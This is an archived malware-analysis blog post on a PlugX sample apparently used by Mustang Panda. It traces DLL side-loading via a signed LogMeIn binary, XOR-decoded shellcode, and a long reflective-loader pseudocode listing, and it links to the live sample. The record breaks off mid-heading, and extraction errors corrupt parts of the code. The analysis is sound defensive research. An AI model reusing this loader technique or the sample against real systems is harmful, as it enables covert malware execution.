{
    "id": "40e3921a-261f-4b76-97d4-5a4abc702a6c",
    "created_at": "2023-02-02T02:07:18.450882Z",
    "updated_at": "2025-03-27T02:16:47.105209Z",
    "deleted_at": null,
    "sha1_hash": "f5529a2813f540bd74a2c33f1a4302a5c0df35a8",
    "title": "2022-12-27 - Diving into a PlugX sample of Mustang Panda group",
    "authors": "",
    "file_creation_date": "2023-02-01T07:37:56Z",
    "file_modification_date": "2023-02-01T07:37:56Z",
    "file_size": 1241381,
    "plain_text": "# Diving into a PlugX sample of Mustang Panda group\n\n**[kienmanowar.wordpress.com/2022/12/27/diving-into-a-plugx-sample-of-mustang-panda-group/](https://kienmanowar.wordpress.com/2022/12/27/diving-into-a-plugx-sample-of-mustang-panda-group/)**\n\nDecember 27, 2022\n\n## 1. Hunting\n\n Recently, in my free time, I continue hunting samples related to PlugX malware of the Mustang Panda group. Among the results returned by VirusTotal, there is a file submitted to VT from LV (Latvia ??) at 2022-12-06 06:39:03 UTC:\n\n Through examining some information of this file, I found that there are many similarities with the samples that I have analyzed and presented in September at the Security Bootcamp conference.\n\n Download sample here: https://github.com/m4now4r/PlugX_Mustang-Panda/\n\n 2. Overview analysis\n\n\n-----\n\n## The above rar file includes an lnk file (a Windows Shortcut) and an abnormal directory containing other files as shown below:\n\n “Written comments of Hungary.doc.lnk” will executes the test.msd file:\n\n test.msd (26c855264896db95ed46e502f2d318e5f2ad25b59bdc47bd7ffe92646102ae0d) has the original name is LMIGuardianSvc.exe. This is a clean file, and belongs to LogMeIn software, with Digital Signature:\n\n LMIGuardianDll.dll (ef2b6b411b79f751d73e824302ca00ff9f0d759a6eea02d2cfb11390d0e9379b), exports 6 functions. However, there are functions with the same address: CrashMain, Escort2,\n\n\n-----\n\n`HttpMain, IsSamePath` and OffLoad. Only the Init function locates at the different address,\n## therefore, it is likely that the function of interest:\n\n LMIGuardianDat.dat (e5e396be385d38f69566aa141de3030ffe4eaad8afb244a2c22df4b6db425478). This file is already encrypted:\n\n To summarize, it can be seen that the Mustang Panda group continues using DLL side- loading technique, the execution flow of the malicious code is as follows:\n\n\n-----\n\n## 3. Detailed analysis\n\n3.1. Analyze test.msd file\n\n## Load the file into IDA, the pseudocode at its WinMain function is as follows:\n\n Pay attention to the mw_build_LMIGuardian_api_funcs_wrap()function, this function will load the LMIGuardianDll.dllfile, get all addresses of the exported functions, and then call the Init function to execute the next code:\n\n\n-----\n\n3.2. Analyze LMIGuardianDll.dll file\n\n## The pseudocode at the Init function is as follows:\n\n\n-----\n\n## Diving into the mw_load_decrypt_and_exec_shellcode() function, we see that it constructs the path to the LMIGuardianDat.datfile, gets the handle to the file, and then allocates a memory area equal to the size of the file:\n\n Next, it will read the contents of the LMIGuardianDat.dat file into the allocated memory, use the xor loop to decode the shellcode, and finally use EnumSystemCodePagesW function to execute the decrypted shellcode:\n\n\n-----\n\n## Based on the above pseudocode, we can completely write a Python script to perform shellcode decoding as follows:\n\n Results before and after decoding:\n\n\n-----\n\n3.3. Analyze shellcode\n\n## Before going into shellcode analysis, inspecting at the LMIGuardianDat_sc.bin file, I found that it has an embedded PE file (removed Magic DOS signature and DOS Stubs):\n\n Load shellcode into IDA, go to address 0xC3F, apply the corresponding structs, we get the size of the embedded PE file as follows:\n\n\n-----\n\n## With all the above information, we can completely extract the PlugX Dll. This Dll only exports one function named BLMSqofHz:\n\n Going back to the shellcode, after defining its code in IDA, the pseudocode of its will call the\n\n`plx_dll_loader` function to acts as a loader, map the PlugX Dll into the new memory region\n## and call the exported function BLMSqofHz to perform the main task of malware:\n\n\n-----\n\n## Let s give a quick summary here:\n\n Based on the pre-calculated hash value to find the address of the API functions are\n```\n   LdrLoadDll, LdrGetProcedureAddress. Then use these functions to get the address of\n\n other API functions as: VirtualAlloc, VirtualProtect, FlushInstructionCache,\n   GetNativeSystemInfo, Sleep, RtlAddFunctionTable and LoadLibraryA.\n\n Recheck the Dll through some fields in Nt Headers Allocate new memory region and mapping the entire Dll payload into the allocated memory. Check and perform relocation (if necessary) Build import table for mapped Dll. Check and process Delay Import (if necessary) Check and change the Characteristics of sections. Execute TLS Callback (if any) Execute DllEntryPoint. Get the name of the exported function, calculate the hash, if it matches the pre- calculated hash, then get the address of the function to execute.\n\n```\n\n-----\n\n## The full pseudocode of the plx_dll_loader function is as follows:\n\n\n-----\n\n```\nint __cdecl plx_dll_loader(int pPlugxDllBaseAddr, _DWORD pre_exportFuncHash, int\nexport_arg1, int export_arg2, int export_arg3, unsigned int dwFlag)\n\n{\n\n // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-\"+\" TO EXPAND]\n\n wstr_kernel32_dll[0] = 'k';\n\n wstr_kernel32_dll[1] = 'e';\n\n wstr_kernel32_dll[4] = 'e';\n\n wstr_kernel32_dll[6] = '3';\n\n wstr_kernel32_dll[7] = '2';\n\n wstr_kernel32_dll[8] = '.';\n\n LoadLibraryA = 0;\n\n VirtualAlloc = 0;\n\n FlushInstructionCache = 0;\n\n GetNativeSystemInfo = 0;\n\n VirtualProtect = 0;\n\n Sleep = 0;\n\n RtlAddFunctionTable = 0;\n\n wstr_kernel32_dll[2] = 'r';\n\n wstr_kernel32_dll[3] = 'n';\n\n wstr_kernel32_dll[5] = 'l';\n\n wstr_kernel32_dll[9] = 'd';\n\n wstr_kernel32_dll[0xA] = 'l';\n\n wstr_kernel32_dll[0xB] = 'l';\n\n qmemcpy(&apiFuncs, \"Sleep\", 5);\n\n qmemcpy(apiFuncs.wstr_LoadLibraryA, \"LoadLibraryAVirtualProtect\", 0x1A);\n\n qmemcpy(apiFuncs.wstr_VirtualAlloc, \"VirtualAlloc\",\nsizeof(apiFuncs.wstr_VirtualAlloc));\n\n qmemcpy(wstr_FlushInstructionCache, \"FlushInstructionCache\",\nsizeof(wstr_FlushInstructionCache));\n\n qmemcpy(&wstr_GetNativeSystemInfo[1], \"etNativeSystemInfo\", 0x12);\n\n str_RtlAddFunctionTable[0x12] = 0x65;\n\n wstr_GetNativeSystemInfo[0] = 0x47;\n\n qmemcpy(str_RtlAddFunctionTable, \"RtlAddFunctionTabl\", 0x12);\n\n LdrLoadDll = plx_retrieve_api_from_hash(0xBDBF9C13);\n\n LdrGetProcedureAddress = plx_retrieve_api_from_hash(0x5ED941B5u);\n\n moduleInfo.Buffer = wstr_kernel32_dll;\n\n moduleInfo.MaximumLength = 0x18;\n\n moduleInfo.Length = 0x18;\n\n tmp_var.LdrGetProcedureAddress = LdrGetProcedureAddress;\n\n LdrLoadDll(0, 0, &moduleInfo, &dllHandle);\n\n apiName.Length = 12;\n\n apiName.Buffer = apiFuncs.wstr_VirtualAlloc;\n\n apiName.MaximumLength = 12;\n\n LdrGetProcedureAddress(dllHandle.kernel32_handle, &apiName, 0, &VirtualAlloc);\n\n apiName.Length = 14;\n\n apiName.MaximumLength = 14;\n\n apiName.Buffer = apiFuncs.wstr_VirtualProtect;\n\n LdrGetProcedureAddress(dllHandle.kernel32_handle, &apiName, 0, &VirtualProtect);\n\n```\n\n-----\n\n```\n apiName.Length = 21;\n\n apiName.MaximumLength = 21;\n\n apiName.Buffer = wstr_FlushInstructionCache;\n\n LdrGetProcedureAddress(dllHandle.kernel32_handle, &apiName, 0,\n&FlushInstructionCache);\n\n apiName.Length = 0x13;\n\n apiName.Buffer = wstr_GetNativeSystemInfo;\n\n apiName.MaximumLength = 0x13;\n\n LdrGetProcedureAddress(dllHandle.kernel32_handle, &apiName, 0,\n&GetNativeSystemInfo);\n\n apiName.Length = 5;\n\n apiName.MaximumLength = 5;\n\n apiName.Buffer = &apiFuncs;\n\n LdrGetProcedureAddress(dllHandle.kernel32_handle, &apiName, 0, &Sleep);\n\n apiName.Length = 0x13;\n\n apiName.Buffer = str_RtlAddFunctionTable;\n\n apiName.MaximumLength = 0x13;\n\n LdrGetProcedureAddress(dllHandle.kernel32_handle, &apiName, 0,\n&RtlAddFunctionTable);\n\n apiName.Length = 12;\n\n apiName.Buffer = apiFuncs.wstr_LoadLibraryA;\n\n apiName.MaximumLength = 12;\n\n LdrGetProcedureAddress(dllHandle.kernel32_handle, &apiName, 0, &LoadLibraryA);\n if ( !VirtualAlloc )\n\n {\n\n  return FALSE;\n\n }\n\n if ( !VirtualProtect )\n\n {\n\n  return FALSE;\n\n }\n\n if ( !Sleep )\n\n {\n\n  return FALSE;\n\n }\n\n if ( !FlushInstructionCache )\n\n {\n\n  return FALSE;\n\n }\n\n if ( !GetNativeSystemInfo )\n\n {\n\n  return FALSE;\n\n }\n\n // check valid payload\n\n cp_pPlugxDllBaseAddr = pPlugxDllBaseAddr;\n\n pPlugxDllNtHeaders = (pPlugxDllBaseAddr + *(pPlugxDllBaseAddr +\n\n```\n\n-----\n\n```\noffsetof(IMAGE_DOS_HEADER, e_lfanew)));\n\n if ( pPlugxDllNtHeaders->Signature != IMAGE_NT_SIGNATURE )\n\n {\n\n  return FALSE;\n\n }\n\n if ( pPlugxDllNtHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_I386 )\n\n {\n\n  return FALSE;\n\n }\n\n plxHeaderInfo.SectionAlignment = pPlugxDllNtHeaders>OptionalHeader.SectionAlignment;// 0x1000\n\n if ( plxHeaderInfo.SectionAlignment & 1 )\n\n {\n\n  return FALSE;\n\n }\n\n // calculate total sections size that need to mapped to memory\n\n total_section_size = 0;\n\n num_of_sections = pPlugxDllNtHeaders->FileHeader.NumberOfSections;\n\n if ( pPlugxDllNtHeaders->FileHeader.NumberOfSections )\n\n {\n\n  pPlugxSectionHeaders = (&pPlugxDllNtHeaders>OptionalHeader.SizeOfUninitializedData + pPlugxDllNtHeaders>FileHeader.SizeOfOptionalHeader);\n\n  do\n\n  {\n\n   if ( ADJ(pPlugxSectionHeaders)->SizeOfRawData )\n\n   {\n\n    plxHeaderInfo.SizeOfRawData = ADJ(pPlugxSectionHeaders)->SizeOfRawData;\n\n   }\n\n   section_size = ADJ(pPlugxSectionHeaders)->VirtualAddress +\nplxHeaderInfo.SizeOfRawData;// VirtualAddress + SizeOfRawData\n\n   if ( section_size <= total_section_size )\n\n   {\n\n    section_size = total_section_size;\n\n   }\n\n   pPlugxSectionHeaders += 0xA;       // points to next section\n\n   total_section_size = section_size;\n\n   plxHeaderInfo.SectionAlignment = pPlugxDllNtHeaders>OptionalHeader.SectionAlignment;\n\n   --num_of_sections;\n\n  }\n\n  while ( num_of_sections );\n\n  cp_pPlugxDllBaseAddr = pPlugxDllBaseAddr;\n\n }\n\n // Retrieve SizeOfImage value\n\n GetNativeSystemInfo(&system_info);\n\n v15 = ~(system_info.dwPageSize - 1);\n\n plx_dllSizeOfImage = v15 & (pPlugxDllNtHeaders->OptionalHeader.SizeOfImage +\nsystem_info.dwPageSize - 1);// Size of image (0x99000)\n\n if ( plx_dllSizeOfImage != (v15 & (total_section_size + system_info.dwPageSize 1)) )\n\n {\n\n```\n\n-----\n\n```\n  return FALSE;\n\n }\n\n // Allocate new base address for mapping PlugX Dll\n\n pPlugxNewBaseAddr = VirtualAlloc(pPlugxDllNtHeaders->OptionalHeader.ImageBase,\nplx_dllSizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);\n\n if ( !pPlugxNewBaseAddr )\n\n {\n\n  pPlugxNewBaseAddr = VirtualAlloc(0, plx_dllSizeOfImage, MEM_RESERVE|MEM_COMMIT,\nPAGE_READWRITE);\n\n }\n\n if ( dwFlag & 1 )               // skip if\n\n {\n\n  *(pPlugxNewBaseAddr + offsetof(IMAGE_DOS_HEADER, e_lfanew)) = *\n(cp_pPlugxDllBaseAddr + offsetof(IMAGE_DOS_HEADER, e_lfanew));\n\n  offset_from_e_lfanew = *(cp_pPlugxDllBaseAddr + offsetof(IMAGE_DOS_HEADER,\ne_lfanew));\n\n  if ( offset_from_e_lfanew < pPlugxDllNtHeaders->OptionalHeader.SizeOfHeaders )\n\n  {\n\n   pPlugxNewNtHeaders = (pPlugxNewBaseAddr + offset_from_e_lfanew);\n\n   do\n\n   {\n\n    ++offset_from_e_lfanew;\n\n    LOBYTE(pPlugxNewNtHeaders->Signature) = *(&pPlugxNewNtHeaders->Signature +\ncp_pPlugxDllBaseAddr - pPlugxNewBaseAddr);\n\n    pPlugxNewNtHeaders = (pPlugxNewNtHeaders + 1);\n\n   }\n\n   while ( offset_from_e_lfanew < pPlugxDllNtHeaders->OptionalHeader.SizeOfHeaders\n);\n  }\n\n }\n\n else                     // exec else\n\n {\n\n  // transfer Plugx Dll Headers to new base addr (0x400 bytes)\n\n  for ( cnt = 0; cnt < pPlugxDllNtHeaders->OptionalHeader.SizeOfHeaders;\n++pPlugxNewBaseAddr )\n\n  {\n\n   ++cnt;\n\n   *pPlugxNewBaseAddr = *(pPlugxNewBaseAddr + cp_pPlugxDllBaseAddr pPlugxNewBaseAddr);\n\n  }\n\n }\n\n // copy all sections data to new mapped address\n\n nTotalSectionCopied = 0;\n\n pPlugxNewNtHeaders = (pPlugxNewBaseAddr + *(pPlugxNewBaseAddr +\noffsetof(IMAGE_DOS_HEADER, e_lfanew)));\n\n tmp_var2.nTotalSectionCopied = 0;\n\n if ( pPlugxNewNtHeaders->FileHeader.NumberOfSections )\n\n {\n\n  pPlugxNewSectionHeaders = (&pPlugxNewNtHeaders>OptionalHeader.AddressOfEntryPoint + pPlugxNewNtHeaders>FileHeader.SizeOfOptionalHeader);\n\n  do\n\n```\n\n-----\n\n```\n  {\n\n   cnt = 0;\n\n   if ( ADJ(pPlugxNewSectionHeaders)->SizeOfRawData )\n\n   {\n\n    do\n\n    {\n\n     // pPlugxMappedSection[cnt] = pPlugxUnMappedSection[cnt]\n\n     *(pPlugxNewBaseAddr + ADJ(pPlugxNewSectionHeaders)->VirtualAddress + cnt) =\n*(cnt\n\n+ ADJ(pPlugxNewSectionHeaders)->PointerToRawData\n\n+ cp_pPlugxDllBaseAddr);\n\n     ++cnt;\n\n    }\n\n    while ( cnt < ADJ(pPlugxNewSectionHeaders)->SizeOfRawData );\n\n    nTotalSectionCopied = tmp_var2.nTotalSectionCopied;\n\n   }\n\n   NumberOfSections = pPlugxNewNtHeaders->FileHeader.NumberOfSections;\n\n   ++nTotalSectionCopied;\n\n   pPlugxNewSectionHeaders += 0xA;\n\n   tmp_var2.nTotalSectionCopied = nTotalSectionCopied;\n\n  }\n\n  while ( nTotalSectionCopied < NumberOfSections );\n\n }\n\n // Perform relocation if needed\n\n delta_offset = pPlugxNewBaseAddr - pPlugxNewNtHeaders->OptionalHeader.ImageBase;\n\n delta_offset = pPlugxNewBaseAddr - pPlugxNewNtHeaders->OptionalHeader.ImageBase;\n\n if ( delta_offset )              // cause pPlugxNewBaseAddr pPlugxNewNtHeaders->OptionalHeader.ImageBase = 0x0 then skip if block\n\n {\n\n  if ( pPlugxNewNtHeaders->OptionalHeader.DataDirectory[5].Size )\n\n  {\n\n   relocation = (pPlugxNewBaseAddr + pPlugxNewNtHeaders>OptionalHeader.DataDirectory[5].VirtualAddress);\n\n   if ( relocation->VirtualAddress )\n\n   {\n\n    v29 = delta_offset;\n\n    while ( 1 )\n\n    {\n\n     for ( ++relocation; relocation != (relocation + relocation->SizeOfBlock);\nrelocation = (relocation + 2) )\n\n     {\n\n      v31 = relocation->VirtualAddress;\n\n      rel_type = LOWORD(relocation->VirtualAddress) >> 0xC;\n\n      switch ( rel_type )\n\n      {\n\n       case IMAGE_DEBUG_TYPE_OMAP_FROM_SRC|IMAGE_DEBUG_TYPE_CODEVIEW:\n\n        v33 = relocation->VirtualAddress;\n\n        delta_offset = relocation->VirtualAddress & 0xFFF;\n\n        *(v33 + pPlugxNewBaseAddr + delta_offset) += v29;\n\n        continue;\n\n```\n\n-----\n\n```\n       case IMAGE_REL_BASED_HIGHLOW:\n\n        *(pPlugxNewBaseAddr + (v31 & 0xFFF) + relocation->VirtualAddress) +=\nv29;\n\n        continue;\n\n       case IMAGE_REL_ALPHA_REFLONG:\n\n        v34 = v29 >> 0x10;\n\n        break;\n\n       case IMAGE_REL_PPC_ADDR32:\n\n        v34 = v29;\n\n        break;\n\n       default:\n\n        continue;\n\n      }\n\n      *(pPlugxNewBaseAddr + (v31 & 0xFFF) + relocation->VirtualAddress) += v34;\n\n     }\n\n     if ( !relocation->VirtualAddress )\n\n     {\n\n      cp_pPlugxDllBaseAddr = pPlugxDllBaseAddr;\n\n      break;\n\n     }\n\n    }\n\n   }\n\n  }\n\n }\n\n // Build Import Table\n\n if ( pPlugxNewNtHeaders->OptionalHeader.DataDirectory[1].Size )\n\n {\n\n  importTblRVA = pPlugxNewNtHeaders>OptionalHeader.DataDirectory[1].VirtualAddress;\n\n  nImportedDll = 0;\n\n  cp_nDllImported = 0;\n\n  pPlugXNewImportDesc = (importTblRVA + pPlugxNewBaseAddr);\n\n  pNameRVA = (importTblRVA + pPlugxNewBaseAddr + offsetof(IMAGE_IMPORT_DESCRIPTOR,\nName));\n\n  tmp_var_1.pPlugXNewImportDesc = (importTblRVA + pPlugxNewBaseAddr);\n\n  if ( ADJ(pNameRVA)->Name )\n\n  {\n\n   // caculate number of Dlls\n\n   do\n\n   {\n\n    pNameRVA += 5;             // points to next NameRVA\n\n    ++nImportedDll;\n\n   }\n\n   while ( ADJ(pNameRVA)->Name );\n\n   cp_nDllImported = nImportedDll;\n\n  }\n\n  delta_offset = 0;\n\n  v102 = dwFlag & 4;\n\n  importTblRVA_ = importTblRVA;\n\n  if ( dwFlag & 4 && nImportedDll > 1 )\n\n  {                      // skip if block\n\n   tmp_var2.pPlugXNewImportDesc = 0;\n\n```\n\n-----\n\n```\n   delta_offset dwFlag >> 0x10;\n\n   nDll = nImportedDll - 1;\n\n   i = 0;\n\n   pPlugXNewImportDesc_ = (importTblRVA + pPlugxNewBaseAddr);\n\n   do\n\n   {\n\n    pPlugxDllBaseAddra = 0x343FD * cp_pPlugxDllBaseAddr + 0x269EC3;\n\n    v42 = &pPlugXNewImportDesc[i + (HIWORD(pPlugxDllBaseAddra) & 0x7FFFu) /\n(0x7FFF / (nImportedDll - i) + 1)];\n\n    ++i;\n\n    qmemcpy(v109, v42, sizeof(v109));\n\n    v43 = v42;\n\n    nImportedDll = cp_nDllImported;\n\n    qmemcpy(v43, pPlugXNewImportDesc_, sizeof(IMAGE_IMPORT_DESCRIPTOR));\n\n    qmemcpy(pPlugXNewImportDesc_, v109, sizeof(IMAGE_IMPORT_DESCRIPTOR));\n\n    cp_pPlugxDllBaseAddr = pPlugxDllBaseAddra;\n\n    ++pPlugXNewImportDesc_;\n\n    pPlugXNewImportDesc = tmp_var_1.pPlugXNewImportDesc;\n\n   }\n\n   while ( i < nDll );\n\n   importTblRVA_ = pPlugxNewNtHeaders>OptionalHeader.DataDirectory[1].VirtualAddress;\n\n  }\n\n  tmp_var2.pPlugXNewImportDesc = (importTblRVA_ + pPlugxNewBaseAddr);\n\n  dllNameRVA = *(importTblRVA_ + pPlugxNewBaseAddr +\noffsetof(IMAGE_IMPORT_DESCRIPTOR, Name));\n\n  if ( dllNameRVA )\n\n  {\n\n   pPlugXNewImportDesc = tmp_var2.pPlugXNewImportDesc;\n\n   do\n\n   {\n\n    module_handle = LoadLibraryA((pPlugxNewBaseAddr + dllNameRVA));\n\n    dllHandle.module_handle = module_handle;\n\n    thunkRef = (pPlugxNewBaseAddr + pPlugXNewImportDesc->OriginalFirstThunk);\n\n    funcRef = (pPlugxNewBaseAddr + pPlugXNewImportDesc->FirstThunk);\n\n    thunkRefInfo = thunkRef->u1.AddressOfData;// AddressOfData, which points to\nthe IMAGE_IMPORT_BY_NAME structure.\n\n    if ( thunkRef->u1.AddressOfData )\n\n    {\n\n     LdrGetProcedureAddress = tmp_var.LdrGetProcedureAddress;\n\n     while ( TRUE )\n\n     {\n\n      if ( thunkRefInfo >= 0 )\n\n      {\n\n       len_str_apiName = 0;\n\n       str_apiName = &thunkRefInfo->Name[pPlugxNewBaseAddr];\n\n       tmp_var_1.str_apiName = str_apiName;\n\n       if ( *str_apiName )\n\n       {\n\n        do\n\n        {\n\n         ++len_str_apiName;\n\n```\n\n-----\n\n```\n         ++str_apiName;\n\n        }\n\n        while ( *str_apiName );\n\n        str_apiName = tmp_var_1.str_apiName;\n\n       }\n\n       apiName.Length = len_str_apiName;\n\n       apiName.MaximumLength = len_str_apiName;\n\n       apiName.Buffer = str_apiName;\n\n       LdrGetProcedureAddress(module_handle, &apiName, 0, &funcRef>u1.Function);// get api address and update IAT table\n\n      }\n\n      else\n\n      {\n\n       LdrGetProcedureAddress(module_handle, 0, LOWORD(thunkRef>u1.AddressOfData), &funcRef->u1.Function);\n\n      }\n\n      ++thunkRef;\n\n      ++funcRef;\n\n      thunkRefInfo = thunkRef->u1.AddressOfData;\n\n      if ( !thunkRef->u1.AddressOfData )\n\n      {\n\n       break;\n\n      }\n\n      module_handle = dllHandle.module_handle;\n\n     }\n\n     pPlugXNewImportDesc = tmp_var2.pPlugXNewImportDesc;\n\n    }\n\n    if ( delta_offset && v102 && cp_nDllImported > 1 )\n\n    {\n\n     Sleep(0x3E8 * delta_offset);\n\n    }\n\n    dllNameRVA = pPlugXNewImportDesc[1].Name;// points to next NameRVA\n\n    ++pPlugXNewImportDesc;         // points to next import (Dll)\n\n    tmp_var2.pPlugXNewImportDesc = pPlugXNewImportDesc;\n\n   }\n\n   while ( dllNameRVA );\n\n  }\n\n }\n\n // Process Delay Import\n\n page_Protection = IMAGE_SCN_CNT_CODE;\n\n if ( pPlugxNewNtHeaders->OptionalHeader.DataDirectory[0xD].Size )\n\n {\n\n  pDelayLoadDesc = (pPlugxNewBaseAddr + pPlugxNewNtHeaders>OptionalHeader.DataDirectory[0xD].VirtualAddress + 4);\n\n  tmp_var2.pdelayImportDesc = pDelayLoadDesc;\n\n  DllNameRVA = ADJ(pDelayLoadDesc)->DllNameRVA;\n\n  if ( DllNameRVA )\n\n  {\n\n   v56 = &ADJ(tmp_var2.pdelayImportDesc)->DllNameRVA;\n\n   do\n\n   {\n\n    module_handle = LoadLibraryA((pPlugxNewBaseAddr + DllNameRVA));\n\n```\n\n-----\n\n```\n    dllHandle.module_handle module_handle;\n\n    ImportAddressTableRVA = (pPlugxNewBaseAddr + ADJ(v56)>ImportAddressTableRVA);\n\n    ImportNameTableRVA = (pPlugxNewBaseAddr + ADJ(v56)->ImportNameTableRVA);\n    if ( ImportAddressTableRVA->u1.AddressOfData )\n\n    {\n\n     LdrGetProcedureAddress = tmp_var.LdrGetProcedureAddress;\n\n     while ( TRUE )\n\n     {\n\n      ImportNameRVA = ImportNameTableRVA->u1.AddressOfData;\n\n      if ( (ImportNameTableRVA->u1.AddressOfData & 0x80000000) == 0 )\n\n      {\n\n       len_str_delayAPIName = 0;\n\n       str_delayAPIName = &ImportNameRVA->Name[pPlugxNewBaseAddr];\n\n       v102 = str_delayAPIName;\n\n       if ( *str_delayAPIName )\n\n       {\n\n        do\n\n        {\n\n         ++len_str_delayAPIName;\n\n         ++str_delayAPIName;\n\n        }\n\n        while ( *str_delayAPIName );\n\n        str_delayAPIName = v102;\n\n       }\n\n       apiName.Length = len_str_delayAPIName;\n\n       apiName.MaximumLength = len_str_delayAPIName;\n\n       apiName.Buffer = str_delayAPIName;\n\n       LdrGetProcedureAddress(module_handle, &apiName, 0,\n&ImportAddressTableRVA->u1.Function);\n\n      }\n\n      else\n\n      {\n\n       LdrGetProcedureAddress(module_handle, 0, ImportNameRVA,\n&ImportAddressTableRVA->u1.AddressOfData);\n\n      }\n\n      ++ImportAddressTableRVA;\n\n      ++ImportNameTableRVA;\n\n      if ( !ImportAddressTableRVA->u1.Function )\n\n      {\n\n       break;\n\n      }\n\n      module_handle = dllHandle.module_handle;\n\n     }\n\n     v56 = &ADJ(tmp_var2.pdelayImportDesc)->DllNameRVA;\n\n    }\n\n    page_Protection = IMAGE_SCN_CNT_CODE;\n\n    v56 += 8;\n\n    tmp_var2.pdelayImportDesc = v56;\n\n    DllNameRVA = ADJ(v56)->DllNameRVA;\n\n   }\n\n   while ( ADJ(v56)->DllNameRVA );\n\n```\n\n-----\n\n```\n  }\n\n }\n\n // check & change section protection\n\n cnt = 0;\n\n if ( pPlugxNewNtHeaders->FileHeader.NumberOfSections )\n\n {\n\n  pPlugxNewSectionHeaders = (&pPlugxNewNtHeaders>OptionalHeader.AddressOfEntryPoint + pPlugxNewNtHeaders>FileHeader.SizeOfOptionalHeader);\n\n  do\n\n  {\n\n   if ( ADJ(pPlugxNewSectionHeaders)->SizeOfRawData )\n\n   {\n\n    sectionCharacteristics = ADJ(pPlugxNewSectionHeaders)->Characteristics;\n\n    section_can_read = ADJ(pPlugxNewSectionHeaders)->Characteristics &\nIMAGE_SCN_MEM_READ;\n\n    if ( sectionCharacteristics & IMAGE_SCN_MEM_EXECUTE )\n\n    {\n\n     if ( section_can_read )\n\n     {\n\n      flNewProtect = IMAGE_SCN_CNT_INITIALIZED_DATA;\n\n     }\n\n     else\n\n     {\n\n      flNewProtect = IMAGE_SCN_CNT_UNINITIALIZED_DATA;\n\n      page_Protection = 0x10;\n\n     }\n\n     if ( sectionCharacteristics >= 0 )\n\n     {\n\n      flNewProtect = page_Protection;\n\n     }\n\n    }\n\n    else\n\n    {\n\n     if ( section_can_read )\n\n     {\n\n      flNewProtect = 4;\n\n      page_protection = 2;\n\n     }\n\n     else\n\n     {\n\n      flNewProtect = IMAGE_SCN_TYPE_NO_PAD;\n\n      page_protection = PAGE_NOACCESS;\n\n     }\n\n     if ( sectionCharacteristics >= 0 )\n\n     {\n\n      flNewProtect = page_protection;\n\n     }\n\n    }\n\n    flOldProtect = flNewProtect;\n\n    if ( ADJ(pPlugxNewSectionHeaders)->Characteristics & IMAGE_SCN_MEM_NOT_CACHED\n)\n\n```\n\n-----\n\n```\n    {\n\n     flNewProtect |= IMAGE_SCN_LNK_INFO;\n\n     flOldProtect = flNewProtect;\n\n    }\n\n    VirtualProtect(\n\n     (pPlugxNewBaseAddr + ADJ(pPlugxNewSectionHeaders)->VirtualAddress),\n\n     ADJ(pPlugxNewSectionHeaders)->SizeOfRawData,\n\n     flNewProtect,\n\n     &flOldProtect);\n\n   }\n\n   ++cnt;\n\n   pPlugxNewSectionHeaders += 0xA;      // points to next section\n\n   page_Protection = IMAGE_SCN_CNT_CODE;\n\n  }\n\n  while ( cnt < pPlugxNewNtHeaders->FileHeader.NumberOfSections );\n\n }\n\n // ExecuteTLS\n\n FlushInstructionCache(0xFFFFFFFF, 0, 0);\n\n if ( pPlugxNewNtHeaders->OptionalHeader.DataDirectory[9].Size )\n\n {\n\n  tlsDir = *(pPlugxNewNtHeaders->OptionalHeader.DataDirectory[9].VirtualAddress +\npPlugxNewBaseAddr + 0xC);\n\n  for ( tlsCallBackFunc = ADJ(tlsDir)->AddressOfCallBacks; ADJ(tlsDir)>AddressOfCallBacks; tlsCallBackFunc = ADJ(tlsDir)->AddressOfCallBacks )\n\n  {\n\n   tlsCallBackFunc(pPlugxNewBaseAddr, 1, 0);\n\n   ++tlsDir;\n\n  }\n\n }\n\n // exec DllEntryPoint func\n\n ((pPlugxNewBaseAddr + pPlugxNewNtHeaders->OptionalHeader.AddressOfEntryPoint))\n(pPlugxNewBaseAddr, 1, 0);\n\n if ( !pre_exportFuncHash )\n\n {\n\n  return pPlugxNewBaseAddr;\n\n }\n\n // check Export Directory size\n\n if ( !pPlugxNewNtHeaders->OptionalHeader.DataDirectory[0].Size )\n\n {\n\n  return pPlugxNewBaseAddr;\n\n }\n\n // retrieve export function name\n\n // calc hash and check with pre-hash\n\n // if match, call this export function\n\n exportDirRVA = (pPlugxNewBaseAddr + pPlugxNewNtHeaders>OptionalHeader.DataDirectory[offsetof(IMAGE_NT_HEADERS, Signature)].VirtualAddress);\n\n numExportedNames = exportDirRVA->NumberOfNames;\n\n if ( !numExportedNames )\n\n {\n\n  return pPlugxNewBaseAddr;\n\n }\n\n if ( !exportDirRVA->NumberOfFunctions )\n\n```\n\n-----\n\n```\n {\n\n  return pPlugxNewBaseAddr;\n\n }\n\n AddressOfNameOrdinalsRVA = exportDirRVA->AddressOfNameOrdinals;\n\n pNameAddressTbl = (pPlugxNewBaseAddr + exportDirRVA->AddressOfNames);\n\n tmp_var.dwExportHash = 0;\n\n pOrdinalsTbl = (pPlugxNewBaseAddr + AddressOfNameOrdinalsRVA);\n\n do\n\n {\n\n  exportNameRVA = *pNameAddressTbl;\n\n  tmp_var2.cnt = 0;\n\n  str_exported_func = (pPlugxNewBaseAddr + exportNameRVA);\n\n  if ( !str_exported_func )\n\n  {\n\n   break;\n\n  }\n\n  chr = *str_exported_func;\n\n  if ( *str_exported_func )\n\n  {\n\n   dwExportHash = tmp_var2.dwExportHash;\n\n   do\n\n   {\n\n    dwExportHash = __ROR4__(chr + dwExportHash, 0xD);\n\n    chr = *++str_exported_func;\n\n   }\n\n   while ( *str_exported_func );\n\n   tmp_var2.dwExportHash = dwExportHash;\n\n   numExportedNames = exportDirRVA->NumberOfNames;\n\n   if ( pre_exportFuncHash == dwExportHash )\n\n   {\n\n    if ( pOrdinalsTbl )\n\n    {\n\n     exportFunc = (pPlugxNewBaseAddr + *(exportDirRVA->AddressOfFunctions + 4 *\n*pOrdinalsTbl + pPlugxNewBaseAddr));\n\n     if ( dwFlag & 8 )\n\n     {\n\n      exportFunc(export_arg3, 4);     // call export function\n\n     }\n\n     else\n\n     {\n\n      exportFunc(export_arg1, export_arg2);\n\n     }\n\n     return pPlugxNewBaseAddr;\n\n    }\n\n   }\n\n  }\n\n  ++pNameAddressTbl;\n\n  ++pOrdinalsTbl;\n\n  ++tmp_var.cnt;\n\n }\n\n while ( tmp_var.cnt < numExportedNames );\n\n```\n\n-----\n\n```\n return pPlugxNewBaseAddr;\n\n}\n\n```\n3.4. Decrypt the configuration of 